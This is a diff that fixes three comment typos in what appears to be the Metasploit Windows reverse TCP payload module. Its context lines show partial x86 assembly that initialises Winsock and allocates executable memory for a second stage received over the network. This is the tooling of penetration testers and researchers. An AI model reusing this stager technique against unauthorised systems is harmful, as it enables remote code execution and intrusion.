@@ -124,7 +124,7 @@ module Payload::Windows::ReverseTcp
 
         mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
         sub esp, eax            ; alloc some space for the WSAData structure
-        push esp                ; push a pointer to this stuct
+        push esp                ; push a pointer to this struct
         push eax                ; push the wVersionRequested parameter
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp                ; WSAStartup( 0x0190, &WSAData );
@@ -207,7 +207,7 @@ module Payload::Windows::ReverseTcp
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
     ^
@@ -249,7 +249,7 @@ module Payload::Windows::ReverseTcp
         mov esi, [esi]          ; dereference the pointer to the second stage length
         push 0x40               ; PAGE_EXECUTE_READWRITE
         push 0x1000             ; MEM_COMMIT
-        push esi                ; push the newly recieved second stage length.
+        push esi                ; push the newly received second stage length.
         push 0                  ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
